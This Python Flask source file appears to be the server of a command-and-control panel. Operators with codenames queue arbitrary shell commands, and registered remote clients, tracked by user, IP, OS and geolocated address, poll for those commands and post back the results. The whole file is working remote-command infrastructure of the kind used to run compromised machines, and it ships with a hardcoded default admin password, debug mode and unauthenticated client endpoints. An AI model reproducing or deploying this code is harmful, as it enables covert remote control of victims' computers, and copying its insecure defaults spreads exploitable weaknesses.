import os
from flask import Flask, redirect, url_for, render_template, request, jsonify, make_response
from flask_sqlalchemy import SQLAlchemy
import bcrypt
import jwt
import datetime
from datetime import timedelta
from functools import wraps
from dotenv import load_dotenv
import random
import string
import requests

# Load environment variables
load_dotenv()
SECRET_KEY = os.getenv('JWT_SECRET_KEY')

app = Flask(__name__)

# Configure the instance folder
app.config['SECRET_KEY'] = SECRET_KEY
app.config['INSTANCE_PATH'] = os.path.join(os.getcwd(), 'instance')  # Set path for instance folder
os.makedirs(app.config['INSTANCE_PATH'], exist_ok=True)  # Ensure instance folder exists

# Path to your admin.db file inside the instance directory
DATABASE_URI = 'sqlite:///' + os.path.join(app.config['INSTANCE_PATH'], 'admin.db')

# Configure the database URI
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URI
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Define a model for the admin table
class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    codename = db.Column(db.String(80), unique=True, nullable=False)
    secret = db.Column(db.String(200), nullable=False)
    role = db.Column(db.String(80), nullable=False)

    def __repr__(self):
        return f"<Admin {self.codename}>"
# Client Data Table
class ClientData(db.Model):
    client_id = db.Column(db.String(64), primary_key=True)  # Unique client ID
    user = db.Column(db.String(128), nullable=False)
    nickname = db.Column(db.String(128), nullable=False)
    ip = db.Column(db.String(64), nullable=False)
    os = db.Column(db.String(128), nullable=False)
    registered_at = db.Column(db.DateTime)  # Registration timestamp
    last_active = db.Column(db.DateTime)  # Last active timestamp
    address = db.Column(db.String(128), nullable=False)

    def __repr__(self):
        return f"<ClientData {self.client_id}>"

# Commands Log Table
class CommandsLog(db.Model):
    log_id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), db.ForeignKey('client_data.client_id'), nullable=False)  # Foreign Key for client_id
    command_initiator = db.Column(db.String(128), nullable=False)
    commands_history = db.Column(db.Text)  # Command history, JSON or serialized text
    client = db.relationship('ClientData', backref=db.backref('commands_logs', lazy=True))

    def __repr__(self):
        return f"<CommandsLog {self.log_id} for {self.client_id}>"

command_to_execute = ""
execution_result = ""

def create_database():
    """Check if admin.db exists in the instance folder. If not, create it and add a default admin."""
    admin_db_path = os.path.join(app.config['INSTANCE_PATH'], 'admin.db')
    if not os.path.exists(admin_db_path):
        print("Database file does not exist. Creating it now...")

        # Create the database and tables within an app context
        with app.app_context():
            db.create_all()
            secret = "secret"
            byte = secret.encode('utf-8')
            salt = bcrypt.gensalt()
            hash = bcrypt.hashpw(byte, salt)  # Do not decode to string, keep it as bytes
            # Add a default admin user
            default_admin = Admin(codename="admin", secret=hash, role="superadmin")
            
            db.session.add(default_admin)
            db.session.commit()
            print("Default admin added to the database.")
    else:
        print("Database already exists. No changes made.")
# Create the database (this call needs to be inside the app context)
create_database()



def generate_jwt(role,codename):
    """Generate a JWT for a given user role."""
    header = {
        'alg': 'HS256',  # Algorithm used to sign the token
        'typ': 'JWT'     # Type of the token
    }

    payload = {
        'user': {
            'role': role,
            'codename': codename
        },
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1),  # Token expires in 1 hour
        'iat': datetime.datetime.utcnow()  # Issued at time
    }

    return jwt.encode(payload, SECRET_KEY, algorithm='HS256', headers=header)




def validate_jwt(token):
    """Validate a JWT token."""
    try:
        decoded_token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return decoded_token
    except jwt.ExpiredSignatureError:
        # print("Token has expired")
        return None
    except jwt.InvalidTokenError:
        print("Invalid token")
        return None





def token_required(f):
    """Decorator to enforce JWT authentication."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.cookies.get('token')  # Get the token from cookies
        if not token:
            return redirect(url_for('login'))  # No token, redirect to login
        decoded_token = validate_jwt(token)
        if not decoded_token:
            return redirect(url_for('login'))  # Inavlid or expired token, redirect to login
        return f(decoded_token, *args, **kwargs)
    return decorated_function




@app.route("/")
def home():
    return redirect(url_for('login'))




@app.route("/login")
def login():
    return render_template("login.html")




@app.route("/dashboard")
@token_required
def dashboard(decoded_token):
    role = decoded_token['user']['role']
    return render_template("dashboard.html", role=role)


# Function to generate a random UUID with 6 characters
def generate_client_id():
    random_uuid = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    timestamp = datetime.datetime.utcnow()
    timestampForClientID = timestamp.strftime('%Y%m%d%H%M%S')
    return f"{random_uuid}-{timestampForClientID}"


def get_address(ip):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        city = data.get("city", "N/A")
        region = data.get("region", "N/A")
        country = data.get("country", "N/A")
        return f"{city} - {region} - {country}"
    
    return "Unable to fetch location"


# Sample route for client registration
@app.route('/api/clientRegistration', methods=['POST'])
def client_registration():
    data = request.get_json()
    print(data)
    # Extract client details from request
    user = data.get('user')
    ip = data.get('public_ip')
    os = data.get('os')

    # Generate a unique client_id (random 6 characters + timestamp)
    client_id = generate_client_id()

    # Calculate the registration date (current UTC time)
    reg_date = datetime.datetime.utcnow()

    # Save the new client data to the database
    new_client = ClientData(
        client_id=client_id,
        user=user,
        nickname="nickname",
        ip=ip,
        os=os,
        registered_at=reg_date,
        last_active=reg_date,
        address = get_address(ip)
    )

    try:
        # Add the new client to the session and commit it to the database
        db.session.add(new_client)
        db.session.commit()
        print(f"New client registered: {client_id}, User: {user}, IP: {ip}, OS: {os}, Registered at: {reg_date}")

        # Return the client_id and registration date as a response
        return jsonify({"client_id": client_id, "reg_date": reg_date.strftime('%Y-%m-%d %H:%M:%S')}), 201

    except Exception as e:
        db.session.rollback()  # Rollback the session in case of error
        print(f"Error saving client data: {e}")
        return jsonify({"error": "An error occurred while registering the client."}), 500



@app.route('/input-command-to-execute-from-web', methods=['POST'])
@token_required
def execute_command(decoded_token):
    global command_to_execute
    global command_initiator
    command_initiator = decoded_token['user']['codename']
    command = request.json.get("command", "")
    if command:
        command_to_execute = command
        print(f"Received command: {command}")  # Log the received command in the terminal
        return jsonify({"status": "Command received"})
    return jsonify({"status": "No command received"})



def update_last_active_time(client):
    if client:
        client.last_active = datetime.datetime.utcnow()  # Directly updating last_active field
        db.session.commit()
        return jsonify({"status": "updated"}), 200
    return jsonify({"error": "Client not found"}), 404

@app.route('/command-transmission-to-client', methods=['GET'])
def receive_command():
    client_id = request.args.get('clientID')  # Get the clientID from the query string
    if not client_id:
        return jsonify({"error": "clientID is required"}), 400  # Return an error if clientID is not provided
    client_in_database = ClientData.query.filter_by(client_id=client_id).first()
    if not client_in_database:
        print("Client id is not present in database")
        return jsonify({"error": "Client is not found in database"})
    if not (client_id == client_in_database.client_id):
        print("Client id with database is not matched")
        return jsonify({"error": "Client is not found in database"})
    update_last_active_time(client_in_database)
    global command_to_execute
    if command_to_execute:
        cmd = command_to_execute
        command_to_execute = ""  # Reset command after sending
        return jsonify({"command": cmd})
    return jsonify({"command": None})


@app.route('/api/getLiveClients', methods=['POST'])
def getLiveClients():
    with app.app_context():  # Ensure we have an active application context
        clients = ClientData.query.all()  # Fetch all clients
        threshold_time = datetime.datetime.utcnow() - timedelta(seconds=12)  # Set the threshold for recent activity

        live_clients = [
            {
                "client_id": client.client_id,
                "user": client.user,
                "nickname": client.nickname,
                "os": client.os
            }
            for client in clients if client.last_active and client.last_active >= threshold_time
        ]
        return jsonify({"live_clients": live_clients}), 200



@app.route('/tabs', methods=['GET'])
def tabs():
    return render_template('tab.html')

@app.route('/execution-result-of-command-from-client', methods=['POST'])
def receive_result():
    global execution_result
    try:
        # Check if the request contains JSON
        if not request.is_json:
            return jsonify({"error": "Invalid data format, expected JSON"}), 400
        data = request.json
        # Check if 'result' key exists in the received JSON
        if "result" not in data:
            return jsonify({"error": "'result' key is missing from the request"}), 400
        execution_result = data.get("result", "No result received")
        print(f"Execution Result Received: {execution_result}")  # Log the result in the terminal
        return jsonify({"status": "Result received"}), 200
    except Exception as e:
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500


@app.route('/execution-result-to-show-in-web', methods=['GET'])
def show_execution_result():
    global execution_result
    try:
        # If no result has been received, notify the client
        if not execution_result:
            return jsonify({"error": "No execution result available"}), 404
        # Return the execution result as JSON
        execution_result_to_send = execution_result
        execution_result = ""
        return jsonify({"execution_result": execution_result_to_send}), 200
    except Exception as e:
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500


@app.route("/super-admin-panel")
@token_required
def super_admin_panel(decoded_token):
    # Check if the decoded token contains a superadmin role
    if decoded_token['user']['role'] == 'superadmin':
        return render_template("superAdminPanel.html")  # Render super admin panel
    else:
        return jsonify({"error": "Access forbidden"}), 403  # Return an error if not a superadmin




# Just code to show how to get all enteirs from database(without admin) in json so taht chatgpt understands it. 
# with app.app_context():
#     admins = Admin.query.filter(Admin.codename != 'admin').all()
#     admin_list = [{'id': admin.id, 'codename': admin.codename, 'role': admin.role} for admin in admins]
#     print(admin_list)  # Printing the JSON-like list directly
@app.route('/api/getAllAdmins', methods=['GET'])
@token_required
def get_all_admins(decoded_token):
    if decoded_token['user']['role'] == 'superadmin':
        try:
            admins = Admin.query.filter(Admin.codename != 'admin').all()
            admins_list = [
                {
                    'id': admin.id,
                    'codename': admin.codename,
                    'role': admin.role,
                }
                for admin in admins
            ]
            return jsonify({'status': 'success', 'admins': admins_list}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    else:
            return jsonify({"error": "Access forbidden"}), 403  # Return an error if not a superadmin




@app.route("/api/createAdmin", methods=["POST"])
@token_required
def createAdmin(decoded_token):
    if decoded_token['user']['role'] == 'superadmin':
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid input. Codename and secret are required."}), 400

        user_codename = data.get("codename")
        user_secret = data.get("secret")

        if not user_codename or not user_secret:
            return jsonify({"error": "Codename and secret are required."}), 400

        # Check if the codename already exists
        if Admin.query.filter_by(codename=user_codename).first():
            return jsonify({"error": "Admin with this codename already exists."}), 409

        # Add the new admin
        hashed_secret = bcrypt.hashpw(user_secret.encode('utf-8'), bcrypt.gensalt())
        new_admin = Admin(codename=user_codename, secret=hashed_secret, role="admin")
        db.session.add(new_admin)
        db.session.commit()

        return jsonify({"message": f"Admin {user_codename} added successfully."}), 201
    else:
        return jsonify({"error": "Access forbidden"}), 403






@app.route("/api/changeSuperAdminPassword", methods=["POST"])
@token_required
def change_super_admin_password(decoded_token):
    # Check if the decoded token contains a superadmin role
    if decoded_token['user']['role'] != 'superadmin':
        return jsonify({"error": "Access forbidden"}), 403  # Access forbidden if not superadmin

    data = request.get_json()
    # Validate input data
    if not data:
        return jsonify({"error": "Invalid input. Please provide current password, new password, and confirmation."}), 400
    
    current_password = data.get('currentPassword')
    new_password = data.get('newPassword')
    confirm_password = data.get('confirmPassword')

    if not current_password or not new_password or not confirm_password:
        return jsonify({"error": "All fields are required."}), 400

    if new_password != confirm_password:
        return jsonify({"error": "New password and confirmation do not match."}), 400

    # Get the superadmin (codename = "admin") from the database
    superadmin = Admin.query.filter_by(codename='admin').first()
    if not superadmin:
        return jsonify({"error": "Superadmin not found."}), 404

    # Check if the current password matches the one stored in the database
    if not bcrypt.checkpw(current_password.encode('utf-8'), superadmin.secret):  # bcrypt expects bytes
        return jsonify({"error": "Current password is incorrect."}), 401

    # Hash the new password
    hashed_new_password = bcrypt.hashpw(new_password.encode('utf-8'), bcrypt.gensalt())  # Store as bytes
    superadmin.secret = hashed_new_password
    db.session.commit()

    return jsonify({"message": "Password changed successfully."}), 200




@app.route("/api/deleteAdmin", methods=["POST"])
@token_required
def deleteAdmin(decoded_token):
    # Check if the decoded token contains a superadmin role
    if decoded_token['user']['role'] != 'superadmin':
        return jsonify({"error": "Access forbidden"}), 403  # Access forbidden if not superadmin

    try:
        data = request.get_json()
        if not data or 'user' not in data:
            return jsonify({"error": "Invalid request. 'user' field is required."}), 400

        admin_codename_to_delete = data['user']

        # Prevent deleting the default superadmin
        if admin_codename_to_delete == 'admin':
            return jsonify({"error": "Cannot delete the default superadmin."}), 403

        # Find the admin in the database
        admin_to_delete = Admin.query.filter_by(codename=admin_codename_to_delete).first()

        if not admin_to_delete:
            return jsonify({"error": "Admin not found."}), 404

        # Delete the admin
        db.session.delete(admin_to_delete)
        db.session.commit()

        return jsonify({"message": f"Admin '{admin_codename_to_delete}' deleted successfully."}), 200

    except Exception as e:
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500

    
@app.route("/api/changeAdminPassword", methods=["POST"])
@token_required
def change_admin_password(decoded_token):
    # Only allow superadmin to change password
    if decoded_token['user']['role'] != 'superadmin':
        return jsonify({"error": "Access forbidden"}), 403  # Access forbidden if not superadmin
    data = request.get_json()
    print(data)
    if not data:
        return jsonify({"error": "Invalid input. Please provide current password, new password, and confirmation."}), 400

    current_password = data.get('currentPassword')
    new_password = data.get('newPassword')
    confirm_password = data.get('confirmPassword')
    # Validate input fields
    if not current_password or not new_password or not confirm_password:
        return jsonify({"error": "All fields are required."}), 400
    if new_password != confirm_password:
        return jsonify({"error": "New password and confirmation do not match."}), 400
    # Get the admin from the database (the admin whose password is to be changed)
    admin_codename = data.get('adminCodename')
    if not admin_codename:
        return jsonify({"error": "'adminCodename' is required."}), 400
    current_admin_object = Admin.query.filter_by(codename=admin_codename).first()
    if not current_admin_object:
        return jsonify({"error": "Admin not found."}), 404
    # Check if the current password matches the one stored in the database (for the superadmin)
    if not bcrypt.checkpw(current_password.encode('utf-8'), current_admin_object.secret):  # bcrypt check
        return jsonify({"error": "Current password is incorrect."}), 401
    # Hash the new password
    hashed_new_password = bcrypt.hashpw(new_password.encode('utf-8'), bcrypt.gensalt())  # Store as bytes
    current_admin_object.secret = hashed_new_password
    db.session.commit()
    return jsonify({"message": "Password changed successfully."}), 200



@app.route("/api/login-verify", methods=['POST'])
def login_verify():
    data = request.get_json()

    if data:
        user_codename = data.get("codename")
        user_secret = data.get("secret")

        if not user_codename or not user_secret:
            return jsonify({"error": "Codename and secret are required"}), 400

        # Query the database for the provided codename
        user_object = Admin.query.filter_by(codename=user_codename).first()

        if user_object and bcrypt.checkpw(user_secret.encode('utf-8'), user_object.secret):
            print("Authentication successful")
            
            token = generate_jwt(user_object.role,user_object.codename)

            # Include the token and the redirection path in the response
            return jsonify({
                "message": "Login successful",
                "token": token,
                "redirect": url_for('dashboard')
            }), 200
        else:
            return jsonify({"error": "Invalid codename or secret"}), 401

    return jsonify({"error": "Bad request"}), 400

if __name__ == "__main__":
    app.run(debug=True)
